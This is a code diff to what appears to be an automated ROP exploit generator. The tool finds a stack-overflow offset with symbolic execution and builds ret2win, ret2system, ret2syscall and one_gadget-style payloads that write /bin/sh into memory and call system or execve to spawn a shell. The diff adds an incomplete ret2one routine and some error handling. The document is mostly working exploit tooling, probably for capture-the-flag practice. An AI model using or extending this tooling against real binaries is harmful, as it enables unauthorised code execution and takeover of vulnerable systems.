@@ -27,6 +27,10 @@ class ROP:
             payload = self.ret2system()
         elif self.analysis.has_syscall():
             payload = self.ret2syscall()
+        elif self.analysis.has_leak_string():
+            payload = self.ret2one()
+        else:
+            print("[!] Exploit not found!")
 
         return payload
     
@@ -49,6 +53,7 @@ class ROP:
         return payload
     
     def ret2win_with_args(self):
+        #TODO: Instead of passing address to win, return address to system or execve inside of win to avoid argument
         payload = cyclic(self.offset)
         payload += self.satisfy_win()
         payload += self.realign()
@@ -84,6 +89,14 @@ class ROP:
         payload += self.fill_reg("rsi", 0)
         payload += p64(self.e.sym['system'])
 
+        return payload
+
+    def ret2one(self):
+        payload = cyclic(self.offset)
+        p = process(self.filename)
+        p.recvuntil(b": ")
+        leak = p.recvline().decode('utf-8').strip()
+        print(self.one_gadget())
         return payload
 
     def supporting_functions_here(self): # ---------------------------------------------
@@ -140,6 +153,7 @@ class ROP:
             val = p64(int(val))
         elif isinstance(val, str):
             val = val.encode('utf-8')
+
         chain = p64(int(self.pop_reg(reg)[0], 16))
         for i in range(self.pop_reg(reg)[1]):
             if i == (self.pop_reg(reg)[2]):
@@ -181,7 +195,7 @@ class ROP:
     def get_writeable_mem(self):
         return self.analysis.elf.sym['__data_start']
     
-    # wrightes /bin/sh into memory
+    # writes /bin/sh into memory
     def write_binsh(self):
         ret = b''
         ret += self.fill_reg(self.get_primitive_regs()[0], self.get_writeable_mem())
@@ -189,7 +203,6 @@ class ROP:
         ret += self.get_primitives()
         return ret
             
-
     def one_gadget(self):
           return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', self.libc]).decode().split(' ')]
 
@@ -225,6 +238,9 @@ class Get2overflow:
                     except ValueError:
                         print("[-] Failed to get offset!")
                         sys.exit(-1)
+                else:
+                    print("[-] Not satisfiable")
+                    sys.exit(-1)
                 simgr.stashes["unconstrained"].remove(path)
                 simgr.drop(stash="active")
 
